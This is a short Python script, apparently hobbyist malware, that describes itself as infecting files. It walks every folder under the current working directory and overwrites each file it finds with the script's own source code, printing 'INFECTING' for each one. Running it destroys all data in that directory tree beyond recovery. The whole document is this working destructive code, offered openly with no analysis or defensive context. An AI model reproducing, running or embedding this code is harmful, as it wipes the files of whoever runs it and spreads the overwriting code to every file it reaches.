import os
import sys



# run this codes on your own risk

try:
    host_files = []
    directory = os.getcwd()

    # copying src code
    def reading_src():
        with open(sys.argv[0], "rb") as src:
            data = src.read()
            for items in host_files:
                with open(items, "wb") as host:
                    host.write(bytes(data))
                print(f"***** INFECTING:{items}*****")
                    



    # traversing files
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            file = os.path.join(root, file_name)
            host_files.append(file)
        reading_src()

except Exception as e:
    print(e)

    # by stephan bazaar

